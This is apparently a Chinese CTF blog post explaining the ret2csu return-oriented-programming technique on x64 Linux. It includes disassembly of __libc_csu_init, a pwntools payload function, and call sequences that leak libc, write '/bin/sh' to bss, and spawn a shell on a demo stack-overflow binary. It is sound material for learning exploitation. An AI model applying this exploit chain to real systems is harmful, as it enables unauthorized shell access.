@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Gemini","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}};
+  </script>
+
+  <meta name="description" content="ROP有许多的奇技淫巧，其中一个就是ret2csu。本文记录一下关于利用__lib_csu_init中的两段通用gadget来实现linux x64 ROP的原理，以及实现时遇到的一些问题。说来也巧，最近参考的网上的资料怎么总有问题，之前是Rootkit，现在ROP也是，一调试就是半天无了，有点蛋疼。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于ROP利用之__lib_csu_init的一些问题">
+<meta property="og:url" content="http://yoursite.com/2020/05/14/csu/index.html">
+<meta property="og:site_name" content="sec4fun">
+<meta property="og:description" content="ROP有许多的奇技淫巧，其中一个就是ret2csu。本文记录一下关于利用__lib_csu_init中的两段通用gadget来实现linux x64 ROP的原理，以及实现时遇到的一些问题。说来也巧，最近参考的网上的资料怎么总有问题，之前是Rootkit，现在ROP也是，一调试就是半天无了，有点蛋疼。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-05-14T08:57:38.000Z">
+<meta property="article:modified_time" content="2020-07-22T12:59:38.000Z">
+<meta property="article:author" content="ma5ker">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://yoursite.com/2020/05/14/csu/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>关于ROP利用之__lib_csu_init的一些问题 | sec4fun</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">sec4fun</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-commonweal">
+
+    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <section class="post-toc-wrap sidebar-panel">
+          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP%E6%8A%80%E6%9C%AF"><span class="nav-number">1.</span> <span class="nav-text">ROP技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%84ROP"><span class="nav-number">1.1.</span> <span class="nav-text">常规ROP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96ROP%E6%96%B9%E5%BC%8F"><span class="nav-number">1.2.</span> <span class="nav-text">其他ROP方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2csu"><span class="nav-number">2.</span> <span class="nav-text">ret2csu</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2csu-%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98"><span class="nav-number">3.</span> <span class="nav-text">ret2csu 一些问题</span></a></li></ol></div>
+      </section>
+      <!--/noindex-->
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ma5ker"
+      src="/images/head.jpg">
+  <p class="site-author-name" itemprop="name">ma5ker</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">37</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Ma5ker" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Ma5ker" rel="noopener" target="_blank"><i class="github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:kcahlb@gmail.com" title="E-Mail → mailto:kcahlb@gmail.com" rel="noopener" target="_blank"><i class="envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </section>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+      
+
+      
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/14/csu/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.jpg">
+      <meta itemprop="name" content="ma5ker">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="sec4fun">
+    </span>
+
+    
+    
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          关于ROP利用之__lib_csu_init的一些问题
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-05-14 16:57:38" itemprop="dateCreated datePublished" datetime="2020-05-14T16:57:38+08:00">2020-05-14</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2020-07-22 20:59:38" itemprop="dateModified" datetime="2020-07-22T20:59:38+08:00">2020-07-22</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>9.2k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>8 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>ROP有许多的奇技淫巧，其中一个就是ret2csu。本文记录一下关于利用__lib_csu_init中的两段通用gadget来实现linux x64 ROP的原理，以及实现时遇到的一些问题。说来也巧，最近参考的网上的资料怎么总有问题，之前是Rootkit，现在ROP也是，一调试就是半天无了，有点蛋疼。</p>
+<a id="more"></a>
+
+<h2 id="ROP技术"><a href="#ROP技术" class="headerlink" title="ROP技术"></a>ROP技术</h2><h3 id="常规ROP"><a href="#常规ROP" class="headerlink" title="常规ROP"></a>常规ROP</h3><p>ROP的话，需要看此文的人应该都已经知道了，大致概括下常规的ROP方式，有下面几个：</p>
+<ul>
+<li>ret2text<ul>
+<li>最简单的就是将溢出的返回地址设置为程序中已有的函数地址执行，二进制程序中如果已经包含我们需要功能的函数就直接用就好了。</li>
+</ul>
+</li>
+<li>ret2shellcode<ul>
+<li>当二进制程序中不包含我们需要的功能代码时，通过给定的读入数据(read函数)函数注入shellcode到内存，然后将返回地址设置到对应位置开始执行即可。</li>
+</ul>
+</li>
+<li>ret2system<ul>
+<li>如果程序使用了system，便可以直接利用system的plt表地址调用system，然后构造栈放入“/bin/bash”地址参数即可起一个shell。</li>
+</ul>
+</li>
+<li>ret2libc<ul>
+<li>通过泄露一个libc内的函数地址，搜索libc版本并根据偏移计算system地址，转为ret2system</li>
+<li>搜索libc版本可以成功在于库随机化和栈随机化的粒度为0x1000，也就是说其低12位其实是不会随着aslr开启而发生改变的，利用这低12位就可以对libc版本进行推测。</li>
+</ul>
+</li>
+</ul>
+<h3 id="其他ROP方式"><a href="#其他ROP方式" class="headerlink" title="其他ROP方式"></a>其他ROP方式</h3><p>当然，除了上面讲的那些常规方式，剩下的就是一些(是很多很多)骚操作了，其中最主要的有下面几个</p>
+<ul>
+<li>ret2csu<ul>
+<li>利用__lib_csu_init实现ROP</li>
+</ul>
+</li>
+<li>ret2reg<ul>
+<li>通过查找call reg 或者 jmp reg指令，让reg指向溢出的空间，调用这些指令进行ROP</li>
+</ul>
+</li>
+<li>ret2_dl_runtime_resolve<ul>
+<li>利用延迟绑定使用的函数dl_runtime_resolve来进行ROP</li>
+</ul>
+</li>
+<li>其他的<ul>
+<li>注入BROP,SROP等等就太复杂了，这些分给你我点了。</li>
+</ul>
+</li>
+</ul>
+<p>本文主要关注点在于ret2csu，我参考的是<a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/">ctf-wiki</a>的这部分觉得没啥的，不过调试的时候直接给我一天干没了，这个博客写的还是有点问题的，也许是我领悟力不够吧。</p>
+<h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><p>说问题之前先讲下ret2csu的原理。ret2csu中用到的核心部分其实是<code>__lib_csu_init</code>中的两段gadget。关于这个<code>__lib_csu_init</code>,本想看下它是干啥的，但查了下基本都在讲其中的gadget，甚至都查不到它为啥出现，这里我姑且猜一下，应该是调用main，也就是二进制程序进入main之前的过程中需要用到的一个函数(如果不是这样，也不一定会出现在二进制文件中是吧)。</p>
+<p>首先需要明确，ret2csu是一种x64 linux中经常用到的ROP技术，先说一下x64架构下函数调用的传参规则。与x86不同，x64下传参优先在寄存器进行，参数1-6依次放入rdi，rsi，rdx，rcx，r8，r9，其他多出的参数压入栈中传递。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure>
+
+<p>上面是ctf-wiki给出的关于<code>__lib_csu_init</code>的汇编，可以看到后面部分(loc_400616开始)是一个完美的设置寄存器的gadget，也就是下面这部分</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br></pre></td></tr></table></figure>
+
+<p>但是这部分虽然用栈值设置了很多寄存器，但是却没有参数寄存器，想调用还需要另一段的配合，就是它上面那段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br></pre></td></tr></table></figure>
+
+<p>利用这两段gadget，我们可以通过栈上数据控制的寄存器有rbx,rbp,r12,r13,r14,r15,rdx,rsi,edi这些，对于ROP一般最多使用三个参数的情况足以。借助这两段gadget可以将栈上安排的数据传递至需要的寄存器，如下</p>
+<ul>
+<li>参数1：栈→r15→r15d→edi(看上去好像只能控制低32位，其实这时候rdi高位本就是0)</li>
+<li>参数2：栈→r14→rsi</li>
+<li>参数3：栈→r13→rdx</li>
+</ul>
+<p>除此之外，第二段gadget后面的<code>call qword ptr [r12+rbx*8]</code>可以成功的实现一个函数调用过程，只需要把函数地址放入r12，再把rbx设置为0，之后将rbp设为1可以防止进入这个gadget的循环，可谓是一个完美的ROP gadget。</p>
+<h2 id="ret2csu-一些问题"><a href="#ret2csu-一些问题" class="headerlink" title="ret2csu 一些问题"></a>ret2csu 一些问题</h2><p>前面这部分原理其实就是ctf-wiki界面所讲的，我只是理解后做了个转述。下面是针对其给出的demo在实验时的一个问题。给的demo结构很简单</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; &#x2F;&#x2F; [rsp+0h] [rbp-80h]</span><br><span class="line"></span><br><span class="line">  return read(0, &amp;buf, 0x200uLL); &#x2F;&#x2F;←overflow</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  write(1, &quot;Hello, World\n&quot;, 0xDuLL);</span><br><span class="line">  return vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>一个基本的read导致的栈溢出，难点在于既没有system，也没有”/bin/sh”,更没有栈可执行，这里采用ret2csu，明面上的惯性思路是</p>
+<ul>
+<li>泄露write地址查libc版本以及libc地址</li>
+<li>计算system地址，找libc中”/bin/sh”字符串地址做参数。</li>
+<li>跳转到它即可</li>
+</ul>
+<p>上面思路第一个最明显的问题就在这儿，首先libc地址很高，所以搜索到的字符串地址必然是有高32位的，所以直接从libc拿/bin/sh是不可行的，需要将/bin/sh注入到内存使用，这里注入位置选bss段就行。</p>
+<p>另一个问题就是我所说的这个教程的一点问题了，首先在ida下可以看到demo文件(github库里下的，如果是他人重编译的那我当场道歉)的<code>__lib_csu_init</code>很明显已经不一样了，变成了下面这样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005A0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005A0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005A0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o</span><br><span class="line">.text:00000000004005A0</span><br><span class="line">.text:00000000004005A0 var_30          &#x3D; qword ptr -30h</span><br><span class="line">.text:00000000004005A0 var_28          &#x3D; qword ptr -28h</span><br><span class="line">.text:00000000004005A0 var_20          &#x3D; qword ptr -20h</span><br><span class="line">.text:00000000004005A0 var_18          &#x3D; qword ptr -18h</span><br><span class="line">.text:00000000004005A0 var_10          &#x3D; qword ptr -10h</span><br><span class="line">.text:00000000004005A0 var_8           &#x3D; qword ptr -8</span><br><span class="line">.text:00000000004005A0</span><br><span class="line">.text:00000000004005A0 ; __unwind &#123;</span><br><span class="line">.text:00000000004005A0                 mov     [rsp+var_28], rbp</span><br><span class="line">.text:00000000004005A5                 mov     [rsp+var_20], r12</span><br><span class="line">.text:00000000004005AA                 lea     rbp, cs:600E24h</span><br><span class="line">.text:00000000004005B1                 lea     r12, cs:600E24h</span><br><span class="line">.text:00000000004005B8                 mov     [rsp+var_18], r13</span><br><span class="line">.text:00000000004005BD                 mov     [rsp+var_10], r14</span><br><span class="line">.text:00000000004005C2                 mov     [rsp+var_8], r15</span><br><span class="line">.text:00000000004005C7                 mov     [rsp+var_30], rbx</span><br><span class="line">.text:00000000004005CC                 sub     rsp, 38h</span><br><span class="line">.text:00000000004005D0                 sub     rbp, r12</span><br><span class="line">.text:00000000004005D3                 mov     r13d, edi</span><br><span class="line">.text:00000000004005D6                 mov     r14, rsi</span><br><span class="line">.text:00000000004005D9                 sar     rbp, 3</span><br><span class="line">.text:00000000004005DD                 mov     r15, rdx</span><br><span class="line">.text:00000000004005E0                 call    _init_proc</span><br><span class="line">.text:00000000004005E5                 test    rbp, rbp</span><br><span class="line">.text:00000000004005E8                 jz      short loc_400606</span><br><span class="line">.text:00000000004005EA                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005EC                 nop     dword ptr [rax+00h]</span><br><span class="line">.text:00000000004005F0</span><br><span class="line">.text:00000000004005F0 loc_4005F0:                             ; CODE XREF: __libc_csu_init+64↓j</span><br><span class="line">.text:00000000004005F0                 mov     rdx, r15</span><br><span class="line">.text:00000000004005F3                 mov     rsi, r14</span><br><span class="line">.text:00000000004005F6                 mov     edi, r13d</span><br><span class="line">.text:00000000004005F9                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:00000000004005FD                 add     rbx, 1</span><br><span class="line">.text:0000000000400601                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400604                 jnz     short loc_4005F0</span><br><span class="line">.text:0000000000400606</span><br><span class="line">.text:0000000000400606 loc_400606:                             ; CODE XREF: __libc_csu_init+48↑j</span><br><span class="line">.text:0000000000400606                 mov     rbx, [rsp+38h+var_30]</span><br><span class="line">.text:000000000040060B                 mov     rbp, [rsp+38h+var_28]</span><br><span class="line">.text:0000000000400610                 mov     r12, [rsp+38h+var_20]</span><br><span class="line">.text:0000000000400615                 mov     r13, [rsp+38h+var_18]</span><br><span class="line">.text:000000000040061A                 mov     r14, [rsp+38h+var_10]</span><br><span class="line">.text:000000000040061F                 mov     r15, [rsp+38h+var_8]</span><br><span class="line">.text:0000000000400624                 add     rsp, 38h</span><br><span class="line">.text:0000000000400628                 retn</span><br><span class="line">.text:0000000000400628 ; &#125; &#x2F;&#x2F; starts at 4005A0</span><br><span class="line">.text:0000000000400628 __libc_csu_init endp</span><br></pre></td></tr></table></figure>
+
+<p>问题所在loc_400606，传值给寄存器的方式已经不再是pop了，而采用了mov，这就导致了栈布局需要做微调。rbx作为第一个被传值的寄存器，其值现在不再位于栈顶了，而是位于栈顶向下的第二个8字节，这很重要，所以正确的payload的形式应该是下面这样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def csu(rbx, rbp, r12, r13, r14, r15, last):</span><br><span class="line">     payload &#x3D; flat([&#39;a&#39;*0x80,&#39;b&#39;*8,p64(csu_2_addr),&#39;a&#39;*8,p64(rbx),p64(rbp),p64(r12),p64(r13),p64(r14),p64(r15),p64(csu_1_addr),&#39;a&#39;*0x38,p64(last)])</span><br><span class="line">     p.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+<p>尽管通过调试解决了这个问题，另一个问题我还没有解决。整个流程中需要至少三次ret2csu过程</p>
+<ul>
+<li>执行write来泄露write地址</li>
+<li>读入/bin/sh</li>
+<li>执行system</li>
+</ul>
+<p>根据上面定义的csu，三次的调用分别为</p>
+<ul>
+<li>泄露write地址<ul>
+<li><code>csu(0,1,write_got,1,write_got,8,main_addr)</code></li>
+</ul>
+</li>
+<li>读入/bin/sh<ul>
+<li><code>csu(0,1,read_got,0,bss_base,16,main_addr)</code></li>
+</ul>
+</li>
+<li>执行system(“/bin/sh”)<ul>
+<li><code>csu(0,1,libc_sys,bss_base,0,0,main_addr)</code></li>
+</ul>
+</li>
+</ul>
+<p>但是跑脚本的时候发现前两次都是正常执行，第三次会出现返回地址错误，目前还不清楚是为什么，之后再调试看看吧……</p>
+<p>终于发现问题了，淦，这是call指令，不能直接给system地址，需要的是存放system地址的内存地址。这里需要把system地址和”/bin/sh”均读入bss段。</p>
+<ul>
+<li>泄露write地址<ul>
+<li><code>csu(0,1,write_got,1,write_got,8,main_addr)</code></li>
+</ul>
+</li>
+<li>读入/bin/sh<ul>
+<li><code>csu(0,1,read_got,0,bss_base,16,main_addr)</code></li>
+</ul>
+</li>
+<li>执行system(“/bin/sh”)<ul>
+<li><code>csu(0,1,bss_base,bss_base+8,0,0,main_addr)</code></li>
+</ul>
+</li>
+</ul>
+<p>以及第二次读入system地址和binsh字符串时多了个”\n”被第三次时的read读进去导致偏移多了一个字节，我去了……</p>
